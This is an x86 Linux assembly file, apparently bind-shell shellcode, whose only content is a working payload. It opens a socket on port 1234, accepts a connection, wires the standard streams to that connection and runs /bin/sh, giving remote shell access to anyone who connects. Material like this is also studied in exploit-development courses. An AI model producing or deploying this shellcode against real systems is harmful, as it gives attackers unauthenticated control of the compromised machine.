global _start

section .text
_start:

	
	;zero out registers for socketcall
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	; Create the socket

	mov al, 0x66 		; socketcall (102)
	mov bl, 0x1		; SYS_SOCKET (1)
	push ecx		; protocol (0)
	push ebx		; SOCK_STREAM (1)
	push 0x2		; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	int 0x80		; execute socket

	mov edi, eax		; move socket to edi

	; Bind the socket

	
	mov al, 0x66		; socketcall (102)
	pop ebx			; SYS_BIND (2)
	xor edx, edx		; zero out edx
	push edx		; INADDRY_ANY (0)
	push word 0xd204	; sin_port = 1234
	push bx			; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	push 0x10		; sizeof(host_addr)
	push ecx		; pointer to host_addr struct
	push edi		; socketfd
	mov ecx, esp		; point ecx to top of stack 
	int 0x80		; execute bind
	
	xor eax, eax		; zero out eax

	; Listen on the socket
	
	push eax		; backlog (0)
	push edi		; socketfd
	mov ecx, esp		; point ecx to stack
	inc ebx			; increment to 3
	inc ebx			; increment to 4
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute listen


	; Accept connections

	xor edx, edx		; zero out edx
	push edx		; NULL
	push edx		; NULL
	push edi		; socketfd
	inc ebx			; SYS_ACCEPT (5)
	mov ecx, esp		; point ecx to stack
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute accept
	
	xchg ebx, eax		; move created client_sock in ebx
	
	; Redirect STDIN, STDERR, STDOUT

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh

	push edx			; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve


	
